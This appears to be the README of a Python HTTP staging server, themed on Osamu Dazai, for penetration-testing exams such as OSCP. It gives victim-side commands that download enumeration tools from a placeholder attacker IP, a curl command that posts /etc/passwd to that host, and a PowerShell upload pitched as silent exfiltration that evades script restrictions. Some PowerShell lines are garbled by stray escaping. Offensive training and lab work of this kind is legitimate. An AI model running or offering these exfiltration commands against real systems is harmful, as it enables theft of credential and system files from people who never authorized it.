# 🩹 Armed Detective Agency: Internal Web Portal (agency_portal.py)

An ultra-lightweight, native HTTP staging web server forged in the image of **Osamu Dazai**. Built explicitly for file transfer and data exfiltration during **CPTS** and **OSCP** environments where strict firewalls or endpoint configurations block raw outbound FTP/SMB traffic.

## ⚡ Features

*   **Zero-Dependency Evasion**: Leverages Python's native HTTP library architecture—requires no pip packages or compilation steps to run.
*   **Bidirectional Control**: Seamlessly serves script inventories to targets via standard `GET` loops while processing data exfiltration via custom `POST` endpoints.
*   **Path Traversal Hardening**: Built-in sanitization blocks incoming stream names from spilling outside your chosen local staging folder directory.
*   **Low-Noise Logging**: Replaces confusing web daemon logs with clean indicators highlighting incoming file drops under operational pressure.

## 🚀 Usage

```bash
python agency_portal.py [-p <PORT>] [-d <DIRECTORY>]
```

### Options
*   `-p`, `--port` : The network port to bind the server on (Default: `8080`)
*   `-d`, `--directory` : The path to serve files from and save uploaded targets to (Default: current directory)

---

## 🎯 Operational Deployments

### Launching the Portal (Attacker Workstation)
To stage a directory and catch incoming traffic on an evasion-friendly web port:
```bash
python agency_portal.py -p 8080 -d /home/kali/payload_staging
```

---

## 💻 Interfacing with Targets (Victim-Side Commands)

### 1. Downloading Files to the Target (`GET`)

**From a Linux Shell (`wget` or `curl`):**
```bash
wget http://<YOUR_ATTACKER_IP>:8080/linpeas.sh
# OR
curl http://<YOUR_ATTACKER_IP>:8080/ningen_shikkaku_enum.py -o enum.py
```

**From a Windows PowerShell Shell:**
```powershell
Invoke-WebRequest -Uri "http://<YOUR_ATTACKER_IP>:8080/winPEAS.exe" -OutFile "C:\(\Users\Public\wp.\)exe"
```

### 2. Exfiltrating Data Back to Attacker (`POST`)

**From a Linux Shell (`curl`):**
Easily throw critical target configurations back into your staging space via standard HTTP headers:
```bash
curl -X POST -H "X-File-Name: targeted_passwd.txt" --data-binary @/etc/passwd http://<YOUR_ATTACKER_IP>:8080/
```

**From a Windows PowerShell Shell:**
Exfiltrate data silently without touching native script restrictions:
```powershell
\$fileData = [System.IO.File]::ReadAllBytes("C:\Users\Public\proof.txt")
\$webClient = New-Object System.Net.WebClient
\$webClient.Headers.Add("X-File-Name", "proof_flag.txt")
\(webClient.UploadData("http://<YOUR_ATTACKER_IP>:8080/", "POST", \)fileData)
```

---
*Disclaimer: Forged explicitly for authorized security assessments, CTF gameplay, and defensive validation structures. Let's move our data effortlessly.*
